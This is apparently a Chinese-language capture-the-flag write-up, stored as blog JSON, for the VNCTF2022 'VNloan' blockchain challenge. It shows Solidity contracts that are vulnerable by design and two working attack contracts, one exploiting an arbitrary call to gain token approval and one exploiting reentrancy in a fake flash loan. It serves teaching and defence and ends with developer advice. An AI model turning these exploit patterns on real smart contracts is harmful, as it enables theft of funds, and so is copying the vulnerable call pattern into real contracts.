{"title":"VNCTF2022 open tournament-> Blockchain-VNloan","uid":"f5b9fca07821fa4050ef59953395a72d","slug":"VNCTF2022 Blockchain-VNloan","date":"2022-08-01T10:45:15.790Z","updated":"2022-12-16T07:22:56.523Z","comments":true,"path":"api/articles/VNCTF2022 Blockchain-VNloan.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221216152229811.png","content":"<h1 id=\"0x00-背景\"><a href=\"#0x00-背景\" class=\"headerlink\" title=\"0x00 背景\"></a>0x00 背景</h1><p>基于 Uniswap V3 的 DeFi 流动性协议Visor Finance遭受黑客攻击，黑客利用重入漏洞耗尽了880万枚VISR代币，当时，VISR的交易价格约为0.93美元，总损失约为820万美元。</p>\n<p>因为call调用产生的漏洞还是比较多的，比如重入漏洞，atn代币增发事件等。</p>\n<span id=\"more\"></span> \n\n<h1 id=\"0x01-VNloan\"><a href=\"#0x01-VNloan\" class=\"headerlink\" title=\"0x01 VNloan\"></a>0x01 VNloan</h1><p>题目链接：<a href=\"https://buuoj.cn/match/matches/81/challenges\">https://buuoj.cn/match/matches/81/challenges</a></p>\n<p>解出密码获得题目合约</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281247244.png\" alt=\"image-20220213222906759.png\"></p>\n<p>Setup.sol</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.4</span><span class=\"token number\">.26</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./VNETH.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Setup</span><span class=\"token punctuation\">&#123;</span>\n    VNETH <span class=\"token keyword\">public</span> vneth<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> Solved<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        vneth<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">VNETH</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">checksuccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>vneth<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token operator\">>=</span><span class=\"token number\">5000</span><span class=\"token punctuation\">)</span>\n        Solved<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isSolved</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>Solved<span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>VNETH.sol</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token number\">0.4</span><span class=\"token number\">.26</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">VNETH</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> name     <span class=\"token operator\">=</span> <span class=\"token string\">\"VN ETHER\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">public</span> symbol   <span class=\"token operator\">=</span> <span class=\"token string\">\"VNeth\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint8</span>  <span class=\"token keyword\">public</span> decimals <span class=\"token operator\">=</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span>  <span class=\"token keyword\">public</span> isLoan<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> guy<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span>  <span class=\"token function\">Withdrawal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span>                       <span class=\"token keyword\">public</span>  balanceOf<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token keyword\">public</span>  allowance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        owner<span class=\"token operator\">=</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1e18</span> ether<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1e18</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> wad<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Withdrawal</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> guy<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        allowance<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>guy<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> wad<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Approval</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> guy<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">fakeflashloan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> target<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>isLoan<span class=\"token operator\">==</span><span class=\"token boolean\">false</span><span class=\"token operator\">&amp;&amp;</span>value<span class=\"token operator\">>=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;&amp;</span>value<span class=\"token operator\">&lt;=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>value<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>value<span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        isLoan<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">]</span><span class=\"token operator\">>=</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>value<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>target<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>value<span class=\"token punctuation\">;</span>\n        isLoan<span class=\"token operator\">=</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">public</span>\n        <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>src <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">&amp;&amp;</span> allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            allowance<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> wad<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        balanceOf<span class=\"token punctuation\">[</span>src<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> wad<span class=\"token punctuation\">;</span>\n        balanceOf<span class=\"token punctuation\">[</span>dst<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> wad<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span> dst<span class=\"token punctuation\">,</span> wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x03-分析漏洞\"><a href=\"#0x03-分析漏洞\" class=\"headerlink\" title=\"0x03 分析漏洞\"></a>0x03 分析漏洞</h1><h2 id=\"解法一-call调用\"><a href=\"#解法一-call调用\" class=\"headerlink\" title=\"解法一  call调用\"></a>解法一  call调用</h2><p>首先分析setup代码，我们可以看到需要满足调用者的余额大于等于5000，确定下来方向然后主要看VNETH合约。</p>\n<p>我们可以看到在合约构造过程中，合约owner以及合约本身有1^18^*1^18^的余额，所以要是我们的攻击合约余额达到5000，可以从owner或合约中转账过来。</p>\n<p>而从合约中想指定账户转账需要提前授权相应数量的代币。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281247308.png\"></p>\n<p>所以在msg.sender是漏洞合约的前提下控制guy为攻击合约，即可为攻击合约获得权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281247277.png\"></p>\n<p>注意到，在该函数中，可以在target的环境下调用data，而target以及data都是可控的，所以漏洞是出现在call调用处。</p>\n<p>所以我们可以构造data（包括function selctor以及对应参数），data可以通过调用approve函数获得。</p>\n<p>再对fakeflashloan函数进行调用，传入data即可调用漏洞合约下的approve函数，此时msg.sender将是漏洞合约本身，攻击合约将会获得来自漏洞合约的指定数量的代币授权。</p>\n<p>授权之后只需要调用transferfrom函数，将对应数量的代币转账到攻击合约中，即可满足解题条件。</p>\n<p>poc如下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    VNETH target <span class=\"token operator\">=</span> <span class=\"token function\">VNETH</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xe67f9c7880049BD323cc73D13Bed19c16dfC27F5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Setup target1<span class=\"token operator\">=</span><span class=\"token function\">Setup</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xb27A31f1b0AF2946B7F582768f03239b1eC07c2c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> guy<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>guy<span class=\"token punctuation\">,</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getallowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> t<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">fakeflashloan</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">,</span>t<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getmoney</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> src<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> dst<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> wad<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">,</span>dst<span class=\"token punctuation\">,</span>wad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">success</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target1<span class=\"token punctuation\">.</span><span class=\"token function\">checksuccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>按照分析过程调用对应函数并传入相应的参数即可。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281247055.png\"></p>\n<h2 id=\"解法二-重入\"><a href=\"#解法二-重入\" class=\"headerlink\" title=\"解法二  重入\"></a>解法二  重入</h2><p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281248648.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281248143.png\"></p>\n<p>分析合约代码可以发现该处存在重入漏洞，而在fakeflashloan函数中data可控，并且对于isLoan变量的修改放在call之后，可以造成重入。</p>\n<p>所以在攻击合约中调用一次fakeflashloan函数，随便输入一个data（bytes4类型，做selector）即可触发重入，攻击合约中的fallback函数内容为调用4次fakeflashloan函数（value是1000的情况下），此时总共调用了五次，余额达到要求。</p>\n<p>但是值得注意的是，调用setup合约中的checksuccess函数时，要由攻击合约中的fallback函数判断达到条件后进行调用，具体原因放在poc之后</p>\n<p>poc如下</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    VNETH target <span class=\"token operator\">=</span> <span class=\"token function\">VNETH</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x4b0d7A551c9371AEfC004Ae1a9F184aCD39B89C6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    Setup target1<span class=\"token operator\">=</span><span class=\"token function\">Setup</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes</span> data <span class=\"token operator\">=</span> <span class=\"token string\">'0xabcdabcd'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">reen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">fakeflashloan</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n         i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n         target<span class=\"token punctuation\">.</span><span class=\"token function\">fakeflashloan</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">==</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n         target1<span class=\"token punctuation\">.</span><span class=\"token function\">checksuccess</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>因为在进行call调用时，是一次call中嵌套着另一次call，总共五次。而在最后一次出发攻击合约中的fallback函数时已经不满足i&lt;4的条件。</p>\n<p>call调用的特点是只返回true或false不会抛出异常，所以他会执行后续代码，也就是相机执行完五次嵌套中的后续代码，攻击合约中的余额将被归零，所以要按照poc中的方法进行攻击即可。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281248138.png\"></p>\n<h1 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04  总结\"></a>0x04  总结</h1><p>call函数灵活性极高，合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式，正是由于这种灵活性极高的函数的滥用造成了各种漏洞。</p>\n<p>在此给开发者提出以下建议：</p>\n<ol>\n<li>在合约开发过程中一定要谨慎的使用此类函数</li>\n<li>并且在使用的过程中，对调用的合约地址，可调用的函数进行严格限制</li>\n<li>智能合约在部署前必须经过严格的审计以及测试。</li>\n</ol>\n","text":"0x00 背景基于 Uniswap V3 的 DeFi 流动性协议Visor 